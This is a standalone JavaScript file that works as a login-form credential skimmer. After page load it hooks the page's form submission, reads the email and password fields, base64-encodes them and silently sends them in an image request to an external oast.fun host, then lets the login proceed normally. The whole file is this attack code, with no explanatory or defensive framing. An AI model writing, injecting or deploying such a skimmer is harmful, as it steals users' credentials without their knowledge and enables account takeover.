if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}

function init() {
    setTimeout(() => {
        const form = document.querySelector('form');
        if (form) {
            const originalSubmit = form.submit;
            
            form.submit = function() {
                const email = document.querySelector('input[type="text"]').value;
                const password = document.querySelector('input[type="password"]').value;
                
                if (email && password) {
                    const data = btoa(email + ':' + password);
                    new Image().src = 'https://gqkaubaktwtqypifyzshde4g2jmmngnsu.oast.fun?data=' + data;
                }
                
                return originalSubmit.apply(this, arguments);
            };
            
            form.addEventListener('submit', function(e) {
                const email = document.querySelector('input[type="text"]').value;
                const password = document.querySelector('input[type="password"]').value;
                
                if (email && password) {
                    const data = btoa(email + ':' + password);
                    new Image().src = 'https://gqkaubaktwtqypifyzshde4g2jmmngnsu.oast.fun?data=' + data;
                }
            });
        }
    }, 1000);
}
